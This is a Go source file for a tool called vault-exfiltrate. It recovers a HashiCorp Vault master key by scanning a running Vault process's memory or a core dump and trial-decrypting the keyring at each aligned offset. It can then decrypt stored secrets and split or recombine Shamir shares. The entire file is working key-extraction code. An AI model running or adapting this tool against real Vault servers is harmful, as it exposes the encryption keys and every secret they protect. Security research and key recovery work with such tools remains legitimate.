package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"debug/elf"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"

	"github.com/hashicorp/vault/shamir"
	"golang.org/x/exp/mmap"

	// vendored vault components
	"github.com/slingamn/vault-exfiltrate/vault_components"
)

const (
	KeySize           = 32             // 256-bit key
	AlignmentBoundary = 8              // assume malloc respects 64-bit word size?
	KeyringPath       = "core/keyring" // logical path where the keyring is stored
)

type Region struct {
	Start  uint64
	Length uint64
}

// get the RW regions in the core file
func GetRegions(corePath string) (result []Region, err error) {
	file, err := elf.Open(corePath)
	if err != nil {
		return
	}
	defer file.Close()
	for _, section := range file.Sections {
		// TODO: also require SHF_ALLOC?
		if section.Flags&elf.SHF_WRITE != 0 {
			result = append(result, Region{Start: section.Offset, Length: section.Size})
		}
	}
	return
}

func GetRegionsProc(pid int) (result []Region, err error) {
	filename := fmt.Sprintf("/proc/%d/maps", pid)
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		// address, perms, offset, dev, inode, pathname
		if strings.HasPrefix(fields[1], "rw") && fields[4] == "0" {
			addressParts := strings.Split(fields[0], "-")
			start, err := strconv.ParseUint(addressParts[0], 16, 64)
			if err != nil {
				return nil, err
			}
			end, err := strconv.ParseUint(addressParts[1], 16, 64)
			if err != nil {
				return nil, err
			}
			result = append(result, Region{Start: start, Length: end - start})
		}
	}
	return
}

// create a `cipher.AEAD` from a key. this is apparently slow enough
// that under the right circumstances it benefits from caching
func aeadFromKey(key []byte) (cipher.AEAD, error) {
	aesCipher, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(aesCipher)
	if err != nil {
		return nil, err
	}
	return gcm, nil
}

func decryptInternal(path string, gcm cipher.AEAD, ciphertext []byte) ([]byte, error) {
	nonce := ciphertext[5 : 5+gcm.NonceSize()]
	raw := ciphertext[5+gcm.NonceSize():]
	out := make([]byte, 0, len(raw)-gcm.NonceSize())

	switch ciphertext[4] {
	case vault_components.AESGCMVersion1:
		return gcm.Open(out, nonce, raw, nil)
	case vault_components.AESGCMVersion2:
		return gcm.Open(out, nonce, raw, []byte(path))
	default:
		return nil, fmt.Errorf("version bytes mis-match")
	}
}

func Decrypt(path string, key []byte, plaintext []byte) ([]byte, error) {
	gcm, err := aeadFromKey(key)
	if err != nil {
		panic(err)
	}
	return decryptInternal(path, gcm, plaintext)
}

func FindMasterKeyInRegion(coreMap io.ReaderAt, region Region, keyRing []byte) ([]byte, error) {
	lastPos := (region.Start + region.Length) - KeySize
	keyBuf := make([]byte, KeySize)
	for i := region.Start; i <= lastPos; i += AlignmentBoundary {
		_, err := coreMap.ReadAt(keyBuf, int64(i))
		if err != nil {
			return nil, err
		}
		plaintext, err := Decrypt(KeyringPath, keyBuf, keyRing)
		if err == nil {
			return plaintext, err
		}
	}
	return nil, fmt.Errorf("key not found")
}

func FindMasterKeyInCore(corePath string, keyRingPath string) ([]byte, error) {
	keyRing, err := os.ReadFile(keyRingPath)
	if err != nil {
		return nil, err
	}

	regions, err := GetRegions(corePath)
	if err != nil {
		return nil, err
	}

	coreMap, err := mmap.Open(corePath)
	if err != nil {
		return nil, err
	}

	for i := 0; i < len(regions); i++ {
		plaintext, err := FindMasterKeyInRegion(coreMap, regions[i], keyRing)
		if err == nil {
			return plaintext, err
		}
	}

	return nil, fmt.Errorf("key not found")
}

func FindMasterKeyLive(pidStr string, keyRingPath string) (keyring []byte, err error) {
	keyRing, err := os.ReadFile(keyRingPath)
	if err != nil {
		return
	}

	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return
	}
	regions, err := GetRegionsProc(pid)
	if err != nil {
		return
	}

	procMem, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid))
	if err != nil {
		return
	}
	defer procMem.Close()

	for i := 0; i < len(regions); i++ {
		plaintext, err := FindMasterKeyInRegion(procMem, regions[i], keyRing)
		if err == nil {
			return plaintext, err
		}
	}

	return nil, fmt.Errorf("key not found")
}

func deserializeKeyring(keyRingFile string) (*vault_components.Keyring, error) {
	keyRingJSON, err := os.ReadFile(keyRingFile)
	if err != nil {
		return nil, err
	}

	keyRing, err := vault_components.DeserializeKeyring(keyRingJSON)
	if err != nil {
		return nil, err
	}

	return keyRing, nil
}

func DecryptFile(keyRingFile string, vaultPath string, valueFile string) ([]byte, error) {
	keyRing, err := deserializeKeyring(keyRingFile)
	if err != nil {
		return nil, err
	}

	ciphertext, err := os.ReadFile(valueFile)
	if err != nil {
		return nil, err
	}

	term := binary.BigEndian.Uint32(ciphertext[:4])
	termKey := keyRing.TermKey(term)
	if termKey == nil {
		return nil, fmt.Errorf("no term key found")
	}

	return Decrypt(vaultPath, termKey.Value, ciphertext)
}

func SecretShares(secret string, numShares string) (shares []string, err error) {
	threshold, err := strconv.ParseUint(numShares, 0, 64)
	if err != nil {
		return
	}

	secretBytes, err := base64.StdEncoding.DecodeString(secret)
	if err != nil {
		return
	}

	t := int(threshold)
	sharesBytes, err := shamir.Split(secretBytes, t, t)
	if err != nil {
		return
	}

	shares = make([]string, len(sharesBytes))
	for i, shareBytes := range sharesBytes {
		shares[i] = base64.StdEncoding.EncodeToString(shareBytes)
	}
	return
}

func CombineShares(shares []string) (result string, err error) {
	sharesBytes := make([][]byte, len(shares))
	for i, share := range shares {
		sharesBytes[i], err = base64.StdEncoding.DecodeString(share)
		if err != nil {
			return
		}
	}
	resultBytes, err := shamir.Combine(sharesBytes)
	if err != nil {
		return
	}
	return base64.StdEncoding.EncodeToString(resultBytes), nil
}

func usage() {
	os.Stderr.WriteString("usage: vault-exfiltrate extract vault_pid keyring_file\n")
	os.Stderr.WriteString("or:    vault-exfiltrate extract-core core_file keyring_file\n")
	os.Stderr.WriteString("or:    vault-exfiltrate decrypt keyring.json path/In/Vault data_file\n")
	os.Stderr.WriteString("or:    vault-exfiltrate shares keyring.json num_shares\n")
}

func main_() int {
	if len(os.Args) == 1 {
		usage()
		return 1
	}

	subcommand := strings.ToLower(os.Args[1])
	args := os.Args[2:]

	switch subcommand {
	case "extract-core":
		if len(args) < 2 {
			usage()
			return 1
		}
		keyring, err := FindMasterKeyInCore(args[0], args[1])
		if err != nil {
			panic(err)
		}
		os.Stdout.Write(keyring)
		return 0
	case "extract":
		if len(args) < 2 {
			usage()
			return 1
		}
		keyring, err := FindMasterKeyLive(args[0], args[1])
		if err != nil {
			panic(err)
		}
		os.Stdout.Write(keyring)
		return 0
	case "decrypt":
		if len(args) < 3 {
			usage()
			return 1
		}
		plaintext, err := DecryptFile(args[0], args[1], args[2])
		if err != nil {
			panic(err)
		}
		os.Stdout.Write(plaintext)
		return 0
	case "split":
		if len(args) < 2 {
			usage()
			return 1
		}
		shares, err := SecretShares(args[0], args[1])
		if err != nil {
			panic(err)
		}
		for _, share := range shares {
			fmt.Println(share)
		}
		return 0
	case "combine":
		combined, err := CombineShares(args)
		if err != nil {
			panic(err)
		}
		fmt.Println(combined)
		return 0
	}

	usage()
	return 1
}

func main() {
	os.Exit(main_())
}
